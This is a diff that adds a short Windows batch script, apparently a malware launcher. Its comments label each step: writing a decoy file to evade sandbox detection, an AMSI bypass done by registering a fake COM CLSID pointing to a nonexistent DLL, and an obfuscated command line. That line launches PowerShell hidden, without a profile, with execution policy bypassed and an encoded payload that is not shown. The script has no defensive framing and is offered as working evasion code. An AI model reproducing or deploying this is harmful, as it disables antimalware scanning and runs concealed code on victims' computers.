@@ -1,0 +1,13 @@
+@echo off
+:: Writte file to disk to evade sandbox detection
+echo microsoft > %userprofile%\\license.pem
+:: AMSI COM Bypass [ 3xploit]
+REG ADD HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec} /f
+REG ADD HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32 /ve /t REG_SZ /d C:\IDontExist.dll /f
+:: Sleep time to refresh regedit
+sleep 3
+:: local batch variable declarations
+sEt !h=e&& sEt U7=n&& sEt k8=d&& sEt db=P
+:: Powershell command obfuscated
+@c^M%k8%.E"x"%!h% /c =%db%oW%!h%rS^h%!h%lL"."%!h%Xe -%U7%o%db% -W^I%U7% hI%k8%D%!h%%U7% -%!h%p By%db%a^S%AA%s -%!h%%U7% %HHH%
+exit
